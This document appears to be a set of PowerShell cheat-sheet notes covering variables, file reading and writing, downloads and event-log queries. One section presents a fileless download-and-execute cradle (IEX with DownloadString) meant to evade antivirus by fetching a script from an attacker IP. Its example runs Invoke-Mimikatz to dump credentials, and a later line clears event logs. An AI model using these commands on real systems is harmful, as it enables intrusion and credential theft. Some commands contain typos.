# Common Commands

## Execution policy - UAC&#x20;

```
> Get-ExecutionPolicy
> Set_ExecutionPolicy Unrestricted
```

## Variables

Variables in PowerShell are prefixed with a dollar ($) symbol and assigned by stating the variable name that is followed by an equals sign (=) and the desired value.&#x20;

```
PS > $foo = ‘bar’   #Variables can be updated by setting them again. 
To display a variable just call the variable by name:
PS > $foo 
```

## File Manipulation

* Using the 'Get-Content' cmdlet, it is possible to read in the contents of a file, the result of which can be stored in a variable for later use or displayed on screen.
* When reading in a file with Get-Content, it is possible to specify how much of the file is read. This is similar to the head and tail commands in Linux.
* With the -TotalCount parameter you can specify how many lines you would like PowerShell to read (from the top, e.g. Get-Content \<PATH> -TotalCount 5).
* The -Tail parameter will do the same but from the bottom of the file.
* In addition to reading files it is possible to write data to them, either by using Set-Content to create and overwrite files or Add-Content which can append content to an existing file.
* Syntax: Set-Content -Value "This is a test" -Path ./test.txt.
* Remember you can use Get-Content to read the file at any time.

```
> Get-Content -Path .\MOCK_DATA.csv
```

* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-6](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-6)
* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-6](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-6)
* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-6](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-6)
* [https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Select-String?view=powershell-6](https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Select-String?view=powershell-6)

## File Transfer

```
> powershell -c “new-object System.Net.WebClient).DownloadFile([URL],'[destination file path and file name]')”
-c executes the subsequent command
new-object - instantiate a .NET or COM object
WebClient - chosen class of object
DownloadFile - method of action
```

I Module Manipulation\
◇ [https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Core/Import-Module?view=powershell-6](https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Core/Import-Module?view=powershell-6)\
◇ [https://docs.microsoft.com/en-gb/powershell/module/microsoft.powershell.core/get-module?view=powershell-6](https://docs.microsoft.com/en-gb/powershell/module/microsoft.powershell.core/get-module?view=powershell-6)\
◇ [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/remove-module?view=powershell-6](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/remove-module?view=powershell-6)

## Download files and inject them directly into memory

Antivirus will scan the disk of your target regularly and block any files that you download on to it, if they are flagged as a virus. You can Bypass this by invoking a powershell command call to pull a remote file directly into memory&#x20;

```
> IEX (New-Object Net.WebClient).DownloadString('http://[attacker IP]/[target powershell script]');[New Powershell Command]
Example:
> IEX(New-Object Net.WebClient).DownloadString('http://10.102.10.91:1234/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds]E
```

* IEX - pull directly into memory
* Net.WebClient - Needed to run the DownloadString function&#x20;

## EventLog&#x20;

PowerShell comes with a cmdlet that allows you to query event logs from the command line. By default, it will query the local machine; however, it can also be used to query logs from remote connections. It has several options that can be used to filter the query and, similar to most PowerShell, the output can be piped to other filters like search and output.&#x20;

```
List of logs and their entries
> Get-eventlog -list
See all the logs of a specific type you can pass the name of the log to the cmdlet. So to see all system logs we can use: 
> Get-eventlog system
Filter logs by time
> Get-eventlog system -after (get-date).addhours(-1)
Advanced filtering by grouping and sorting
> Get-Eventlog -LogName system -Newest 1000 | group-object -Property source -noelement | sort-object -Property count -descending
Export logs to file
> Get-Eventlog application | export-csv - path application.csv
Clear Event Logs  
> Clear-Eventlog "Windows PowerShell" -clear
```

